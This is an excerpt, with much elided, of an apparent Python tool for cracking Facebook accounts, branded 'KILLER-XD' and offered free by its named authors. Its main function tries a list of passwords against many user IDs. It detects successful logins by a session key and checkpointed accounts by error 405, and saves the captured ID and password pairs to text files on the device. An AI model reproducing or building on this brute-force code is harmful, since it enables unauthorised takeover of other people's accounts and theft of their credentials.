...
def logo():
 ...
 ##  ##    ####    ######   ######   ######   ##  ##                                                       
    {green}(GANDU){white}  """)                                                                                  
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner     : KILLER AND PAKTHOON ")
    print(f" {white}{green}[~]{white} Facebook  : кїггєя devil")
    print(f" {white}{green}[~]{white} Tool      : FREE ")
    print(f" {white}{green}[~]{white} Github    : Killerkhaniihan")
    print(f" {white}{green}[~]{white} Status    : {green}Free ")
    print(f" {white}{green}[~]{white} Version   : 0.1")
    print(50*'-')
...
def bapi(uid,pwx,total):
    ...
    try:
        ...
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}KILLER-XD{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    print(f'\r{green}[KILLER-OK] {uidX} | {pw} {white}')
                    open('/sdcard/KILLER-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[PAKTHOON-CP] {uid}     | {pw} {white}')
                    open('/sdcard/PAKTHOON-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    ...
    try:
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r{green}[KILLER-OK] {uid} | {pw} {white}')
                    open('/sdcard/KILLER-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
